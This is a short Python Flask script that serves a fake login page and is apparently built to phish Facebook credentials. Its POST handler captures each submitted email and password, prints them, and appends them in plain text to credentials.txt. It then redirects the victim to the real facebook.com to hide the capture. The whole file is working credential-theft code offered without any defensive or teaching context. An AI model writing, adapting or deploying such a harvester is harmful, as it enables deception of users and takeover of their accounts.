from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login_post():
    email = request.form.get('email')
    password = request.form.get('password')
    

    print(f"[Login] Email: {email}, Password: {password}",flush=True)
    with open("credentials.txt","a") as file:
        file.write("[+] Facebook:\n")
        file.write(f"   Email:{email}  ,  Password:{password}\n")
        file.close()

    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    app.run(debug=True, port=5000)
